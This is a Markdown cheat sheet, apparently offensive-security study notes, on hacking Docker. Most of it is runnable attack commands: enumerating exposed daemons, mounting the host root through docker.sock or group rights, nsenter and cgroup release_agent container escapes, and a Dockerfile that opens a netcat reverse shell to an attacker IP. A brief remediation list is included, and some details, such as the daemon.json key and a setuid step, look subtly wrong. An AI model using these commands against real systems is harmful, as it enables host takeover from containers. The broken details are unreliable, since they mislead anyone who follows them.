# Docker Hacking


For basic information about docker try here: [[Docker]]. Typically you are trying to escape from a container and generally these escapes stem from misconfigurations of the container from services or access controls. 

Docker is a client-server model:
- The Docker Daemon - does amongst many things:
	- Runs Docker containers
	- Interacts with Docker containers
	- Manages the Docker containers on the host system.
	- Handles Docker Volumes - persistent data storage
	- Logging and Monitoring 
		- Captures container logs
		- Provides insight into container activities, errors, and debugging information.
		- Monitor resource utilisation
- The Docker Client
	- Communicate to Docker Daemon with API or Unix Socket
	- Docker Client != Docker Compose
- Docker Compose 
	- Orchestration with [[YAML]] files
- Docker Desktop
	- GUI application for managing Docker Containers and components available for Linux, Windows and MacOS
- Docker Images
	- Created with a Dockerfile
- Docker Container
	- An instance of a Docker Image providing an executable environment 

Containers have networking capabilities and their own file system and achieve this through using three components of the Linux kernel:
- Namespaces - segregate system resources such as processes, files, and memory away from other namespaces.
- Cgroups - Cgroups are used by containerization software such as LXC or Docker
- OverlayFS



## How to know when you are in a container?

[pspy](https://github.com/DominicBreuker/pspy) on Linux or Systernals proc\*-related tools or access with tasklist for windows.
```bash
ls -la / # And find:
.dockerenv

# Lack of processes or dockerd
ps aux 
ps aux | grep dockerd

# Docker Processes
cat /proc/1/cgroup 
cat /proc/1/cgroup | grep docker
# Traverse proc to host
cd /proc/1234/root/
```
[dockerd Documentation](https://docs.docker.com/engine/reference/commandline/dockerd/)


Check for mount misconfigurations. It is a misconfiguration if Docker container is running `--privileged`, meaning we are can mount to these disks as container does not need disks 
```bash
# check if disks are mountable into the host filesystem 
fdisk -l # Is a better way as disks can named by the users...

mount /dev/$sdaX /mnt

# If you are not root or another mn

cp /bin/sh $mount_misconfiguration_dir
# Give the binary suid privileges
chmod u+s /bin/sh  
# And PrivEsc on the host after breakout.

# Mounted Socket Escape
# Search the socket
find / -name docker.sock 2>/dev/null
# It's usually in /run/docker.sock

```

[Deepce](https://github.com/stealthcopter/deepce.git) is like PEAS-NG for Docker

Docker has a socket [[Network-Protocols]] on 5000 so that another host can send commands to it, not default, but possible.

## Preface

Add IP and domain name to /etc/hosts
```bash
echo "$IP $DOMAIN" | tee -a /etc/hosts
```

Configure Docker to trust your instance, either make `/etc/docker/daemon.json` or enter:
```json
{
	 "target-id" : ["docker-domain.name:$DOCKERPORTLOW","docker-domain.name:$DOCKERPORTHIGH"]
}
```

Control Docker(Linux)
```bash
systemctl stop docker
systemctl start docker
```

Docker Commands
```bash
RUN echo "Docker"
COPY 
````
For full list see [Commands](https://docs.docker.com/engine/reference/commandline/cli/)

## Docker Enumeration

Remote enumeration
```bash
nmap -sV -p 2375 $IP
curl http://$IP:2375/version
# Remote execution on the docker container
docker -H tcp://$IP:2375 ps
```

Docker host and guest
```bash
# Docker is utilitizable on a host machine?
docker -H $remotehost $dockcmd
docker ps
docker version
docker image ls
docker config ls

# Inside a Docker Image?
#
# Get capabilities of the container from inside the container - libcap2-bin package
capsh --print 
# Check routing
ip a
```
[cli Tool](https://github.com/containers/skopeo)

[GTFOBins](https://gtfobins.github.io/gtfobins/docker/#shell) for Docker
```bash
docker images ls # list images required
```
Accessing Docker Container and exec..
```bash
docker -H $remotehost run -v /:/mnt --rm -it -d $image:$tag
docker -H $remotehost run -v /:/mnt --rm -it $image:$tag chroot /mnt sh
```

## Host to Docker to Host Privilege Escalation
#### Abuse Through Group Permissions - Docker, Sudoers Group and SUID permissions

To gain root privileges through Docker we need to be part of the Docker or Sudoers Group or the Docker client has the SUID bit set 
```bash
id
ls -la $(which docker)
```
If we are of the groups mentioned above or SUID bit is set we can escalate through the container and mount back onto the host file system as the root user of the Docker Container.

#### Writable Docker Socket

To gain root privileges through Docker we need to be part of the Docker Group or root user the Docker client or it has the SUID bit set, **and the Docker Socket is writable**.
```bash
# Typically
ls -la /var/run/docker.sock
find / -type f -name docker.sock 2>/dev/null

# Then mount 
docker -H unix:///$path/$to/$the/docker.sock run -v /:/mnt --rm -it $image chroot /mnt bash
```
## Host to Docker Hacking 

#### Abusing Docker Registry

[Docker registries](https://docs.docker.com/registry/) are stateless server side application stores the Docker Image. Registries store and provide Docker images for use. Private registries contain various called a **tag**. The Docker Registry is a JSON endpoint query it with 

Nmap scan to find the ports to interact with the container.

```bash
# postman
GET http://$domain:$port/
````

#### Reversing Images
Download the image to reverse
```docker
docker pull app/app:$TAG
```

[Dive](https://github.com/wagoodman/dive) is a tool for exploring each layer in a docker image. 

#### Uploading Malicious Docker Images

Dockerfile 
```docker
FROM $image:

RUN apt-get update -y
RUN apt-get install netcat -y # Socat would be better!
RUN nc -c /bin/sh $IP $PORT
```
Build image
```bash
docker build
```
Then upload with push:
```
docker push
```

## Docker Escapes

#### Docker Shared Directories

Shared Directories (Volume Mounts) are connected host and guest file systems, which are mounted with Read-Only or Read-Write permissions. 
- Read access to get:
	- Credentials
	- `ssh` keys - see [[SSH-Cheatsheet]]
- Write access to:
	- Write [[Web-Shells]]
	- Write [[Persistence]] mechanisms
	- Write Reverse Shells - [[Reverse-Shells-Listing]]

#### Shared Namespaces

Namespaces segregate system resources, which on Linux assign to a namespace and process identifier.Every container will have unique namespace on the host machine. 

Find a namespace:
```bash
# Can we see namespaces from the host machine?
ps aux
```
We then mount the namespace of the process running outside of the container with a sh shell.
```bash
# namespace enter
nsenter --target $PID --mount sh
# --target $NAMESPACE 
# --mount # mount to the target namespace
# --uts # Share the same UTS namespace as target
# --ipc # Enter the Inter-process comunitcation namespace 
# --net # enter the network namespace
nsenter --target 1 --mount --uts --ipc --net /bin/bash
```

#### Misconfigured Privileges

If a docker container is running with privileged mode it bypasses the Docker engine and has direct communication with host OS. List container capabilities with:
```bash
capsh --print | grep # admin chroot sys_module sys_time
```
The commented out grep-ables indicate privilege mode. [Trailofbits PoC](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so.)
```bash
# On the host
# docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
 
# In the container
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
 
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
 
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

Remediation:
- Do not a Docker container run with the `--privileged` flag
- Do not run as root inside the container
- use `--cap-drop=all` - [Use the “no-new-privileges” security option](https://raesene.github.io/blog/2019/06/01/docker-capabilities-and-no-new-privs/)
- [Limit resources available to the container](https://docs.docker.com/engine/reference/run/#runtime-constraints-on-resources).
- Restrict actions and syscalls with [[SELinux]], [seccomp](https://docs.docker.com/engine/security/seccomp/), [AppArmor](https://docs.docker.com/engine/security/apparmor/)
- Use official images
- Regularly rebuild images to apply security patches
#### Escaping with a Exposed Docker Daemon

Docker's use of Inter-process Communication (IPC) rather than network interface are essential for performance when transferring data to and from a Docker Container. It use Unix sockets, which has Linux file system permissions and why the requirement of a user to be part of the docker group for permissions to access the socket owned by Docker.

Exploitation of Docker Socket within the container
```bash
# Is there a docker socket?
ls -la /var/run | grep sock

# inflitrate the docker container with a bad image
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# May require CTRL+C to cancel the exploit till it works
ls /
chroot /mnt # Now go full linux pirate and board the container 
```

#### Creating Privileged Containers

Use the Docker Client to make a privileged container
```bash
docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem $DockerImageName
# Check if Container is operational
docker -H unix:///app/docker.sock ps
# Get Shell on Docker through the Docker Client
docker -H unix:///app/docker.sock exec -it $IDstring /bin/bash
```

## Docker Hacking Tools

#### Docker Client

Download to the Docker Client: [https://master.dockerproject.org/linux/x86_64/docker](https://master.dockerproject.org/linux/x86_64/docker) to interact with Docker Daemons, see [[Docker]] for more legitimate uses and use cases.

#### DEEPCE

[GitHub - deepce](https://github.com/stealthcopter/deepce) - Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE) is: A pure `sh` script with no dependencies, which can make use of additional tools such as `curl`, `nmap`, `nslookup` and `dig` if available to perform in-memory only enumeration. *..however most of the exploits create new containers which will cause disk writes, and some exploits will overwrite `runC` which can be destructive, so be careful!*

The following is the list of enumerations performed by DEEPCE:
- Container ID & name (via reverse dns)
- Container IP / DNS Server
- Docker Version
- Interesting mounts
- Passwords in common files
- Environment variables
- Password hashes
- Common sensitive files stored in containers
- Other containers on same network
- Port scan other containers, and the host machine itself
- Find exposed docker soc
Exploits:
- Docker Group Privilege Escalation
- Privileged mode host command execution
- Exposed Docker Sock
For each of the exploits above payloads can be defined in order to exploit the host system. These include:
- Reverse TCP shell
- Print /etc/shadow
- Add new root user
- Run custom commands
- Run custom payload binaries

```bash
wget https://github.com/stealthcopter/deepce/raw/main/deepce.sh
curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o deepce.sh
```
## Tricks

#### Where to escape on the network with - No ping and you need to pivot

Q: What is the Default Gateway for the Docker Container?

Use `/dev/tcp/ipaddr/port` or python

```bash
#!/bin/bash   
ports=(21 22 53 80 443 3306 8443 8080)   
for port in ${ports[@]}; do   
	timeout 1 
	bash -c "echo \"Port Scan Test\" > /dev/tcp/1.1.1.1/$port && echo $port is open || /dev/null"    
done
```


```python
#!/usr/bin/python3
import socket
host = "1.1.1.1"
portList = [21,22,53,80,443,3306,8443,8080]
for port in portList:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((host,port))
            print("Port ", port, " is open")
        except:
            print("Port ", port, " is closed")
```

Netcat
`nc -zv 192.168.100.1 1-65535`


## References

[Docker](https://docs.docker.com/get-started/overview/)
[THM Room Docker Rodeo](https://tryhackme.com/room/dockerrodeo)
[trailofbits](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so.)
[cgroups](https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt)
[Commands](https://docs.docker.com/engine/reference/commandline/cli/)
[Hacktricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation)
[Use the “no-new-privileges” security option](https://raesene.github.io/blog/2019/06/01/docker-capabilities-and-no-new-privs/)
[seccomp](https://docs.docker.com/engine/security/seccomp/)
[AppArmor](https://docs.docker.com/engine/security/apparmor/)
[THM Container Vulnerabilities](https://tryhackme.com/room/containervulnerabilitiesDG)
[dockerd Documentation](https://docs.docker.com/engine/reference/commandline/dockerd/)
[GitHub - deepce](https://github.com/stealthcopter/deepce)